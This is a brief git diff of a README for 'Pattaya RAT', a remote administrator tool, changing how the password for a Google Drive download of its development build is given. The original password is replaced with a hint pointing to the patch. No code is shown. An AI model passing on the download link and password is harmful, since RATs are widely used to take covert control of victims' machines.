@@ -2,7 +2,7 @@
 
 ## Pattaya RAT is an experimental real-time based Remote Administrator Tool (RAT).<br>
 
-#### Now Pattaya RAT is already release in Development version you can download using this <a href="https://drive.google.com/file/d/1S6eEFPZWZcPqyZywDhrsjZtgZ6HGJ0pC/view?usp=sharing" target="_blank">link</a> // password is "ยินดีตอนรับสู่พัทยา"
+#### Now Pattaya RAT is already release in Development version you can download using this <a href="https://drive.google.com/file/d/1S6eEFPZWZcPqyZywDhrsjZtgZ6HGJ0pC/view?usp=sharing" target="_blank">link</a> // password is: <find the git .patch>
 ## Demo
 https://youtu.be/Ht4GMrWczVo
 
